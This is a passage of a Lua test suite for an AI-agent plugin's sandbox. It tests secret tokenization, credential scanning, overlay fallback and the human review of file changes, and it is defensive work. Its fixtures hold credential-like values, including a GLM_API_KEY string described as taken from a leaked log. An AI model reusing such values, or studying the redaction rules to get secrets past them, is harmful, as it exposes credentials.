    -- 环境变量：sanitized_env 给 token（AI/日志面），sandbox_env 还原真实值（沙箱进程面）
    vim.env.NEOAI_TEST_REPL_KEY = fake
    local sanitized = secret.sanitized_env()
    t.true_(secret.has_token(sanitized.NEOAI_TEST_REPL_KEY), "sanitized_env 应为 token")
    local env = runtime.sandbox_env(nil)
    t.eq(fake, env.NEOAI_TEST_REPL_KEY, "sandbox_env 应还原真实密钥")
    vim.env.NEOAI_TEST_REPL_KEY = nil
    if runtime.backend() ~= "bwrap" then secret.reset(); return end
    -- 命令参数中的 token：沙箱内应还原为真实密钥（长度 #fake vs token 更长）
    local tok = secret.tokenize(fake)
    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { mode = "dry_run" } } }, function()
      local done, out = false, nil
      require("NeoAI.tools").execute("run_command", {
        command = "printf '%s' '" .. tok .. "' | wc -c", description = "t",
      }, {}):then_(function(r)
        out = tostring(r)
        done = true
      end, function(e)
        out = "ERR:" .. tostring(e and e.message or e)
        done = true
      end)
      t.true_(vim.wait(15000, function() return done end), "run_command 应完成")
      t.true_(out ~= nil and out:find(tostring(#fake), 1, true) ~= nil,
        "命令应拿到真实密钥（长度 " .. #fake .. "，实际: " .. tostring(out) .. "）")
      t.true_(out == nil or out:find(tostring(#tok), 1, true) == nil,
        "命令不应拿到 token 长度 " .. #tok)
    end)
    secret.reset()
  end)

  it("AppImage：沙箱环境注入 APPIMAGE_EXTRACT_AND_RUN（可配置关闭）", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local env = runtime.sandbox_env(nil)
    t.eq("1", env.APPIMAGE_EXTRACT_AND_RUN, "默认应注入 extract-and-run，避免沙箱内 FUSE 挂载")
    with_config({ tools = { sandbox = { appimage_extract_and_run = false } } }, function()
      local env2 = runtime.sandbox_env(nil)
      t.nil_(env2.APPIMAGE_EXTRACT_AND_RUN, "关闭配置后不应注入")
    end)
  end)

  it("密钥防护：文本层按变量名强制脱敏（纯 hex / 含点号多段密钥）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    -- 复现日志泄露：GLM_API_KEY 值 = 纯小写 hex + `.` + 无数字段，熵检测会漏
    -- （hex 段被 exclude_pure_hex 排除，另一段因无数字不满足候选条件）。
    local raw = "dfe946fb66864c48927f31f2aa49164d.rwbWDAfnQjlHuMFt"
    local line = "GLM_API_KEY=" .. raw
    local out = secret.tokenize(line)
    t.true_(not out:find(raw, 1, true), "按变量名应强制 token 化，实际: " .. out)
    t.true_(not out:find("dfe946fb", 1, true), "纯 hex 段也不应泄露")
    t.matches("NEOKEY_", out, "应回传 token")
    local back, unresolved = secret.detokenize(out)
    t.eq(line, back, "应可无损还原")
    t.eq(0, unresolved, "应全部解析")
    -- JSON 风格键值同样按名脱敏，且保留键结构
    local j = secret.tokenize('{"PASSWORD": "hunter2"}')
    t.true_(not j:find("hunter2", 1, true), "JSON 值应脱敏")
    t.matches('"PASSWORD"', j, "应保留键结构")
    t.eq('{"PASSWORD": "hunter2"}', (secret.detokenize(j)), "JSON 应无损还原")
    -- 非敏感名 + 纯 hex 仍不误报（保持既有行为）
    local sha = "sha=a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"
    t.eq(sha, (secret.tokenize(sha)), "非敏感名不应被 token 化")
    secret.reset()
  end)

  it("密钥防护：代码表达式（NAME = os.getenv(...)）不被误判为原始密钥", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local code = table.concat({
      "local function ai_config()",
      '  local api_key = os.getenv("GIT_COMMIT_AI_API_KEY")',
      "  if not api_key then return nil end",
      "  return { api_key = api_key }",
      "end",
    }, "\n")
    local out, used = secret.tokenize(code)
    t.eq(code, out, "代码表达式不应被 token 化")
    t.eq(0, #used, "不应产生 token")
    t.nil_(secret.find_real_secret(code), "不应命中原始密钥（否则 edit_file 会被误终止）")
    t.nil_(secret.scan({ edits = { { old_text = "x", new_text = code } } }).secret, "扫描参数不应命中")
    -- 注释/文档中的 "Bearer token" 不应被当作凭据进入映射表
    local doc = "-- Bearer token required for auth"
    t.eq(doc, (secret.tokenize(doc)), "注释中的 Bearer 不应被 token 化")
    t.nil_(secret.find_real_secret(doc), "注释不应进入映射表")
    -- 真实 Bearer 凭据仍应被 token 化
    local hdr = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV"
    t.matches("NEOKEY_", (secret.tokenize(hdr)), "真实 Bearer 凭据应被 token 化")
    secret.reset()
  end)

  it("密钥防护：赋值值不像凭据时不登记原始密钥（短值/普通单词/路径不误报）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    -- 源码/文档里的普通赋值不应登记为原始密钥，否则后续命令含该片段会被误拦截
    -- （回归：`'password': 'bar'`、`key_separator = "."`、`CONFIGFILE_KEY = 'pyproject.toml'`）。
    for _, s in ipairs({
      "{'username': 'foo', 'password': 'bar', 'host': 'bar.com'}",
      'child_node.key_separator = "."',
      "CONFIGFILE_KEY = 'pyproject.toml'",
      "METADATA_KEY = '__metadata__'",
    }) do
      local out, used = secret.tokenize(s)
      t.eq(s, out, "非凭据赋值不应被 token 化: " .. s)
      t.eq(0, #used, "非凭据赋值不应产生 token: " .. s)
    end
    t.nil_(secret.find_real_secret("pyproject.toml"), "普通文件名不应登记为原始密钥")
    -- 路径值（`*_KEY = /path`）不是凭据：登记后任何含该路径片段的命令都会被硬拦截。
    local path = "/root/test/apps/python/.venv"
    t.nil_(secret.find_real_secret(path), "路径不应登记为原始密钥")
    local cmd = "env | grep -i proxy; ls -la " .. path .. "/bin/python*"
    t.nil_(secret.scan({ command = cmd }).secret, "含普通路径的命令不应被判定为原始密钥")
    -- 相对/多段路径值同样不登记（如 `"cache_key": "bin/python"`），否则 `bin/python`
    -- 这类路径片段会命中 `.../.venv/bin/python*` 命令。
    for _, s in ipairs({
      '{"cache_key": "bin/python"}',
      'exec_key = apps/python/.venv',
    }) do
      local out, used = secret.tokenize(s)
      t.eq(s, out, "相对路径赋值不应被 token 化: " .. s)
      t.eq(0, #used, "相对路径赋值不应产生 token: " .. s)
    end
    t.nil_(secret.find_real_secret("bin/python"), "相对路径片段不应登记为原始密钥")
    -- 真正的凭据赋值仍应脱敏并可无损还原。
    local cred = '{"PASSWORD": "hunter2"}'
    local tok = secret.tokenize(cred)
    t.true_(not tok:find("hunter2", 1, true), "真实凭据赋值仍应 token 化")
    t.eq(cred, (secret.detokenize(tok)), "凭据赋值应无损还原")
    -- 敏感环境变量名扫描不应把 NeoAI 内部事件标识当作变量名。
    t.eq(0, #secret.scan_names({ "SANDBOX_SECRET_BLOCKED: 工具参数包含原始密钥，已终止 Agent" }),
      "内部事件标识不应被当作敏感环境变量名")
    t.true_(#secret.scan_names({ "AWS_SECRET_ACCESS_KEY=xxx" }) > 0, "真实敏感变量名仍应识别")
    secret.reset()
  end)

  it("密钥防护：敏感环境变量名出现只提级待审（不终止，带警告）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    secret.reset()
    with_config({ tools = { sandbox = { ephemeral_roots = {} } } }, function()
    local code = 'local api_key = os.getenv("GIT_COMMIT_AI_API_KEY")\n'
    local p = vim.fn.tempname() .. ".lua"
    local ctx = {}
    local done = false
    require("NeoAI.tools").execute("edit_file", {
      filepath = p, mode = "write", content = code, description = "t",
    }, ctx):then_(function() done = true end, function() done = true end)
    t.true_(vim.wait(10000, function() return done end), "edit_file 应完成")
    t.eq(true, ctx.secret_operation, "应提级（secret_operation），而非终止")
    t.true_(vim.tbl_contains(ctx.secret_names or {}, "GIT_COMMIT_AI_API_KEY"), "应记录敏感环境变量名")
    local found
    for _, it in ipairs(sandbox.list_reviews({ review_state = "PENDING" }) or {}) do
      for _, f in ipairs(it.files or {}) do if f.path == p then found = it end end
    end
    t.not_nil(found, "应产生待审变更单元")
    t.true_(found.secret_warning and (found.secret_warning.count or 0) > 0, "待审项应带密钥警告")
    t.true_(#(found.secret_warning.names or {}) > 0, "警告应含敏感环境变量名")
    fs.delete_file(p)
    secret.reset()
    end)
  end)

  it("密钥防护：环境变量 token 化注入可观测信号且可整体关闭", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    vim.env.NEOAI_TEST_API_KEY = fake
    local ov = secret.sanitized_env()
    t.true_(ov.NEOAI_TEST_API_KEY ~= nil, "应 token 化敏感变量")
    t.true_(ov[secret.env_marker_name()] ~= nil, "应注入 token 化信号")
    t.matches("NEOAI_TEST_API_KEY", ov[secret.env_marker_name()], "信号应列出被 token 化的变量名")

    with_config({ tools = { sandbox = { secrets = { tokenize_env = false } } } }, function()
      local ov2 = secret.sanitized_env()
      t.eq(nil, ov2.NEOAI_TEST_API_KEY, "关闭后不应 token 化环境变量")
      t.eq(nil, ov2[secret.env_marker_name()], "关闭后不应注入信号")
    end)

    vim.env.NEOAI_TEST_API_KEY = nil
    secret.reset()
  end)

  it("密钥防护：AI 读取到 KEY 时结果附加 token 说明", function(t)
    local secret = require("NeoAI.sandbox.secret")
    local fs = require("NeoAI.utils.fs")
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    local path = vim.fn.tempname()
    fs.write_file(path, "API_KEY=" .. fake .. "\n")
    local done = false
    require("NeoAI.tools").execute("read_file", { filepath = path, description = "t" }, {}):then_(function(r)
      local s = tostring(r)
      t.true_(s:find(fake, 1, true) == nil, "不应回传真实密钥")
      t.matches("NEOKEY_", s, "应回传 token")
      t.matches("仅对 AI 不可见", s, "应附加 token 说明")
      t.matches("自动替换回原有", s, "说明应包含自动还原语义")
      t.matches("不影响程序实际运行", s, "说明应澄清遮蔽不影响程序运行")
      t.matches("不代表程序出错", s, "说明应澄清遮蔽不代表程序出错")
      done = true
    end, function(e)
      t.true_(false, "read_file 失败: " .. tostring(e and e.message or e))
      done = true
    end)
    t.true_(vim.wait(5000, function() return done end), "应完成")
    vim.fn.delete(path)
    secret.reset()
  end)

  it("运行时：expose_paths 在遮蔽之后只读暴露并前置到 PATH", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    with_config({ tools = { sandbox = { expose_paths = { dir } } } }, function()
      local prefix = runtime.process_prefix({ cwd = "/tmp" })
      t.not_nil(prefix, "应能构造进程前缀")
      local joined = table.concat(prefix, " ")
      t.true_(joined:find("--ro-bind " .. dir .. " " .. dir, 1, true) ~= nil, "应只读绑定 expose 路径")
      local env = runtime.sandbox_env(nil)
      t.true_(tostring(env.PATH):find(dir, 1, true) ~= nil, "PATH 应包含 expose 目录")
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("视图一致性：git 读工具在沙箱命名空间内看到暂存内容", function(t)
    local fs = require("NeoAI.utils.fs")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" or vim.fn.executable("git") ~= 1 then return end
    local root = vim.fn.tempname()
    fs.ensure_dir(root)
    vim.fn.system({ "git", "-C", root, "init", "-q" })
    vim.fn.system({ "git", "-C", root, "config", "user.email", "t@t" })
    vim.fn.system({ "git", "-C", root, "config", "user.name", "t" })
    fs.write_file(root .. "/a.txt", "base\n")
    vim.fn.system({ "git", "-C", root, "add", "a.txt" })
    vim.fn.system({ "git", "-C", root, "commit", "-qm", "init" })
    local prev = vim.fn.getcwd()
    vim.fn.chdir(root)
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      -- 暂存一次修改：真实磁盘仍为 base
      require("NeoAI.tools").execute("edit_file", {
        filepath = root .. "/a.txt", mode = "write", content = "changed\n", description = "t",
      }, {}):then_(function()
        return require("NeoAI.tools").execute("git_diff", { description = "t" }, {})
      end):then_(function(diff)
        t.matches("+changed", tostring(diff), "git_diff 应显示暂存后的内容")
        t.true_(tostring(diff):find("+base", 1, true) == nil, "git_diff 不应以真实磁盘为准")
        return require("NeoAI.tools").execute("git_status", { description = "t" }, {})
      end):then_(function(st)
        t.matches("a.txt", tostring(st), "git_status 应显示暂存修改的文件")
        t.true_(fs.exists(root .. "/a.txt"), "真实文件仍应存在")
        t.eq("base\n", fs.read_file(root .. "/a.txt"), "真实文件不应被改动")
        done = true
      end, function(e)
        t.true_(false, "git 沙箱执行失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(20000, function() return done end), "git 工具应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(root, "rf")
    runtime.reset()
  end)

  it("运行时：overlay 不可用时默认拒绝执行（不降级）", function(t)
    local fs = require("NeoAI.utils.fs")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    fs.write_file(dir .. "/real.txt", "REAL\n")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      -- 模拟容器内 userns 限制：overlay 实测不可挂载
      runtime.probe().overlayfs = false
      t.false_(runtime.overlay_available(), "overlay 应被判定为不可用")
      local done, rejected = false, nil
      require("NeoAI.tools").execute("run_command", { command = "ls", description = "t" }, {}):then_(function()
        done = true
      end, function(e)
        rejected = e
        done = true
      end)
      t.true_(vim.wait(10000, function() return done end), "run_command 应完成")
      t.not_nil(rejected, "overlay 不可用时默认应拒绝执行，而非降级运行")
      t.matches("SANDBOX_OVERLAY_UNAVAILABLE", tostring(rejected and rejected.message), "应给出 overlay 不可用错误")
      t.true_(fs.exists(dir .. "/real.txt"), "真实文件不应被改动")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
    runtime.reset()
  end)

  it("运行时：显式允许时 overlay 不可用降级为私有可写 cwd", function(t)
    local fs = require("NeoAI.utils.fs")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    fs.write_file(dir .. "/real.txt", "REAL\n")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = {
      mode = "dry_run", review = { enabled = true }, overlay_fail_closed = false,
    } } }, function()
      sandbox.reset()
      -- 模拟容器内 userns 限制：overlay 实测不可挂载
      runtime.probe().overlayfs = false
      t.false_(runtime.overlay_available(), "overlay 应被判定为不可用")
      local done = false
      local ctx = {}
      require("NeoAI.tools").execute("run_command", { command = "ls", description = "t" }, ctx):then_(function(r)
        t.true_(not tostring(r):find("real.txt", 1, true), "降级 cwd 应为私有目录，不暴露真实项目文件")
        -- 降级提示仅用户可见：不进模型结果内容，改挂 ctx.ui_notice 供 UI 展示。
        t.true_(not tostring(r):find("降级模式", 1, true), "降级提示不应写入模型可见结果")
        t.matches("降级模式", tostring(ctx.ui_notice), "降级提示应挂到 ctx.ui_notice")
        t.true_(fs.exists(dir .. "/real.txt"), "真实文件不应被改动")
        done = true
      end, function(e)
        t.true_(false, "显式允许降级时命令仍应可执行: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(10000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
    runtime.reset()
  end)

  it("运行时：overlay 可用时普通命令不触发降级提示", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local candidate = require("NeoAI.sandbox.candidate")
      local wrapper = require("NeoAI.sandbox.wrapper")
      local specs = wrapper.build_overlay_specs(dir, candidate.process_dir(), {})
      local writable = #specs > 0
      for _, s in ipairs(specs) do
        if not runtime.overlay_writable(s.root, s.upper, s.work) then writable = false end
      end
      if not writable then return end -- overlay 不可用环境跳过
      local done = false
      local ctx = {}
      require("NeoAI.tools").execute("run_command", { command = "echo ok", description = "t" }, ctx):then_(function(r)
        t.false_(ctx.sandbox_degraded, "overlay 可用时不应标记降级")
        t.nil_(ctx.ui_notice, "overlay 可用时不应有降级提示")
        t.true_(tostring(r):find("ok", 1, true) ~= nil, "命令应正常输出")
        done = true
      end, function(e)
        t.true_(false, "命令应可执行: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(20000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
    runtime.reset()
  end)

  it("运行时：T2 特权档显示专用提示，不误报降级", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      local ctx = {}
      require("NeoAI.tools").execute("run_command", { command = "unshare --version", description = "t" }, ctx):then_(function(r)
        t.eq(true, ctx.sandbox_userns, "T2 应标记 userns")
        t.false_(ctx.sandbox_degraded, "T2 属有意设计，不应标记为降级")
        t.matches("特权档", tostring(ctx.ui_notice), "T2 应显示特权档专用提示")
        t.true_(not tostring(ctx.ui_notice):find("降级模式", 1, true), "T2 不应显示降级告警")
        t.true_(not tostring(r):find("特权档", 1, true), "提示不应写入模型可见结果")
        done = true
      end, function(e)
        t.true_(false, "T2 命令应可执行: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(20000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
    runtime.reset()
  end)

  it("runtime：能力探测假阳性时按真实路径实测并降级 --bind", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    runtime.reset()
    runtime.probe()
    runtime.capabilities().overlayfs = true -- 模拟粗粒度探测假阳性
    local orig = runtime.overlay_writable
    runtime.overlay_writable = function() return false end
    local prefix, err = runtime.process_prefix({
      cwd = "/tmp", upper = "/tmp/neoai_ovl_u", work = "/tmp/neoai_ovl_w",
      fallback_cwd = "/tmp/neoai_ovl_f",
    })
    runtime.overlay_writable = orig
    t.not_nil(prefix, err)
    local joined = table.concat(prefix, " ")
    t.true_(joined:find("--bind", 1, true) ~= nil, "真实路径实测失败应降级为 --bind")
    t.true_(joined:find("--overlay", 1, true) == nil, "不应使用 overlay")
    runtime.reset()
  end)

  it("异步审批：执行不阻塞，产出待审变更单元并可应用", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local tool_service = require("NeoAI.services.tool_service")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      tool_service.reset()
      -- 审批 UI 不应被调用（async 模式不使用执行前阻塞审批）
      local shown = false
      tool_service.set_approval_ui({ show = function() shown = true end, hide = function() end })
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "ORIG\n")
      local done = false
      require("NeoAI.tools").execute("edit_file", {
        filepath = p, mode = "write", content = "NEW\n", description = "t",
      }, {}):then_(function(r)
        t.false_(shown, "async 模式不应弹执行前审批窗")
        t.true_(not tostring(r):find("等待异步确认", 1, true), "结果不应向模型暴露待审状态")
        t.eq("ORIG", trim(fs.read_file(p)), "执行后真实工作区不应被修改")
        local items = sandbox.list_reviews({ review_state = "PENDING" })
        t.eq(1, #items, "应有一个待审变更单元")
        t.true_(vim.tbl_contains(items[1].write_set, p), "write_set 应含目标文件")
        local res = sandbox.apply(items[1].change_set_id, { auto_approve = true })
        t.true_(res.ok, tostring(res.reason))
        t.eq("NEW", trim(fs.read_file(p)), "应用后应写入真实工作区")
        fs.delete_file(p)
        tool_service.set_approval_ui(nil)
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(3000, function() return done end), "edit_file 应完成")
    end)
  end)

  it("异步审批：拒绝不应用并丢弃候选", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "KEEP\n")
      local done = false
      require("NeoAI.tools").execute("edit_file", {
        filepath = p, mode = "write", content = "DROP\n", description = "t",
      }, {}):then_(function()
        local item = sandbox.list_reviews({ review_state = "PENDING" })[1]
        t.not_nil(item)
        sandbox.reject(item.change_set_id, "no")
        t.eq("KEEP", trim(fs.read_file(p)), "拒绝后真实文件不应改变")
        local after = sandbox.list_reviews()[1]
        t.eq("REJECTED", after.review_state)
        local res = sandbox.apply(item.change_set_id, {})
        t.false_(res.ok, "已拒绝的变更单元不应可应用")
        fs.delete_file(p)
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(3000, function() return done end), "edit_file 应完成")
    end)
  end)

  it("丢弃候选后待审项同步失效：重开审批界面不再显示", function(t)
    local sandbox = require("NeoAI.sandbox")
    local review = require("NeoAI.sandbox.review")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local cand = {
        candidate_digest = "sha256:discardme", created_at = os.time(), effect = "fs_write",
        files = { { path = "/tmp/neoai_discard.txt", action = "create", after_hash = "h", content = "x" } },
      }
      store.write_candidate(cand)
      local item = review.enqueue(cand, { tool = "run_command" })
      t.not_nil(item)
      t.eq(1, sandbox.pending_count(), "入队后应有一个待审文件")
      t.true_(sandbox.discard("sha256:discardme"), "候选应被丢弃")
      t.eq(0, sandbox.pending_count(), "丢弃候选后不应再有待审")
      -- 模拟重开聊天/审批界面：清空内存态后从磁盘重建
      review.reset()
      t.eq(0, #sandbox.list_reviews({ review_state = "PENDING" }), "重开后不应重新显示已丢弃的修改")
      local persisted = store.read_review(item.change_set_id)
      t.eq("REJECTED", persisted and persisted.review_state, "丢弃应持久化为 REJECTED")
    end)
  end)

  it("相同内容重复编辑共享候选摘要：取代旧项不得删除新项引用的候选", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local review = require("NeoAI.sandbox.review")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local dir = vim.fn.tempname()
      fs.ensure_dir(dir)
      local p = dir .. "/f.txt"
      local function mk()
        -- 相同路径 + 相同内容 → 相同候选摘要（内容寻址）
        local cand = {
          candidate_digest = "sha256:shared", created_at = os.time(), effect = "fs_write",
          files = { { path = p, action = "create", after_hash = "h", content = "x" } },
        }
        store.write_candidate(cand)
        return cand
      end
      local i1 = review.enqueue(mk(), { id = "cs_shared_1", tool = "edit_file" })
      local i2 = review.enqueue(mk(), { id = "cs_shared_2", tool = "edit_file" })
      t.not_nil(i1)
      t.not_nil(i2)
      -- wrapper 入队后取代同路径旧项（排除新项）：共享摘要不得被删除
      review.supersede_by_paths({ p }, i2.change_set_id)
      t.true_(store.read_candidate("sha256:shared") ~= nil, "被新项引用的候选不应被删除")
      local res = review.apply(i2.change_set_id, { auto_approve = true })
      t.true_(res.ok, "应用共享候选应成功: " .. tostring(res.reason))
      vim.fn.delete(dir, "rf")
    end)
  end)

  it("选择性应用：只应用候选中的指定文件", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "echo A > a.txt; echo B > b.txt", description = "t",
      }, {}):then_(function()
        local item = sandbox.list_reviews({ review_state = "PENDING" })[1]
        t.not_nil(item)
        t.eq(2, #item.write_set)
        local res = sandbox.apply(item.change_set_id, { auto_approve = true, files = { dir .. "/a.txt" } })
        t.true_(res.ok, tostring(res.reason))
        t.true_(fs.exists(dir .. "/a.txt"), "选中的文件应被应用")
        t.false_(fs.exists(dir .. "/b.txt"), "未选中的文件不应被应用")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(10000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("按文件审批：应用单文件后其余文件保留待审，可逐个拒绝", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local review = require("NeoAI.sandbox.review")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local dir = vim.fn.tempname()
      fs.ensure_dir(dir)
      local pa, pb = dir .. "/a.txt", dir .. "/b.txt"
      local function mk(path, content)
        return { path = path, action = "create", after_hash = "h" .. content, content = content, base_exists = false }
      end
      local cand = {
        candidate_digest = "sha256:two", effect = "fs_write", created_at = os.time(),
        files = { mk(pa, "A\n"), mk(pb, "B\n") },
      }
      store.write_candidate(cand)
      local item = review.enqueue(cand, { tool = "edit_file" })
      t.not_nil(item, "应入队")
      -- 仅应用 a.txt
      local res = review.apply(item.change_set_id, { auto_approve = true, files = { pa } })
      t.true_(res.ok, tostring(res.reason))
      t.true_(fs.exists(pa), "a.txt 应被应用")
      t.false_(fs.exists(pb), "b.txt 不应被应用")
      -- 未选中的 b.txt 应保留为新的待审项
      local pending = sandbox.list_reviews({ review_state = "PENDING" })
      t.eq(1, #pending, "剩余文件应保留一个待审项")
      t.eq(pb, pending[1].files[1].path, "待审项应只含 b.txt")
      -- 逐个拒绝该文件 → 队列清空
      review.reject_file(pending[1].change_set_id, pb)
      t.eq(0, #sandbox.list_reviews({ review_state = "PENDING" }), "拒绝后不应再有待审")
      fs.delete_file(pa)
      vim.fn.delete(dir, "rf")
    end)
  end)

  it("空候选（0 文件）不入待审队列，历史空项也被过滤", function(t)
    local sandbox = require("NeoAI.sandbox")
    local review = require("NeoAI.sandbox.review")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local empty = { candidate_digest = "sha256:empty", files = {}, created_at = os.time(), effect = "fs_write" }
      t.nil_(review.enqueue(empty, { tool = "edit_file" }), "空候选不应入队")
      -- 模拟历史残留的空变更单元：list 应过滤，pending_count 不计入
      store.write_review({
        change_set_id = "cs_empty", review_state = "PENDING", apply_state = "NOT_REQUESTED",
        write_set = {}, files = {}, created_at = os.time(),
      })
      t.eq(0, #sandbox.list_reviews({ review_state = "PENDING" }), "空变更单元应被过滤")
      t.eq(0, sandbox.pending_count(), "空变更单元不应计入待审计数")
    end)
  end)

  it("待审计数按文件计：一个多文件变更单元计为多个待审", function(t)
    local sandbox = require("NeoAI.sandbox")
    local review = require("NeoAI.sandbox.review")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local cand = {
        candidate_digest = "sha256:multi",
        created_at = os.time(),
        effect = "process",
        files = {
          { path = "/tmp/multi_a.py", action = "create", after_hash = "a" },
          { path = "/tmp/multi_b.py", action = "create", after_hash = "b" },
        },
      }
      store.write_candidate(cand)
      review.enqueue(cand, { id = "cs_multi", tool = "run_command" })
      t.eq(1, #sandbox.list_reviews({ review_state = "PENDING" }), "应为一个变更单元")
      t.eq(2, sandbox.pending_count(), "待审计数应按文件计（2 个文件）")
    end)
  end)

  it("包安装按安装命令（package_key）合并为一个审批单元", function(t)
    local sandbox = require("NeoAI.sandbox")
    local review = require("NeoAI.sandbox.review")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local function mk(digest, path)
        local cand = {
          candidate_digest = digest, created_at = os.time(), effect = "process",
          files = { { path = path, action = "create", after_hash = "h:" .. path, content = "x" } },
        }
        store.write_candidate(cand)
        return cand
      end
      local meta = {
        tool = "run_command", package = true, package_manager = "apt-get",
        package_names = { "curl" }, package_key = "apt-get:curl",
        risk_level = 2, command = "apt-get install -y curl",
      }
      local it1 = review.enqueue(mk("sha256:pk1", "/var/lib/apt/lists/a"), meta)
      local it2 = review.enqueue(mk("sha256:pk2", "/var/lib/apt/lists/b"), meta)
      t.not_nil(it1)
      t.eq(it1.change_set_id, it2.change_set_id, "同安装命令应合并到同一变更单元")
      local pending = sandbox.list_reviews({ review_state = "PENDING" })
      t.eq(1, #pending, "合并后待审队列应只有一个包安装条目")
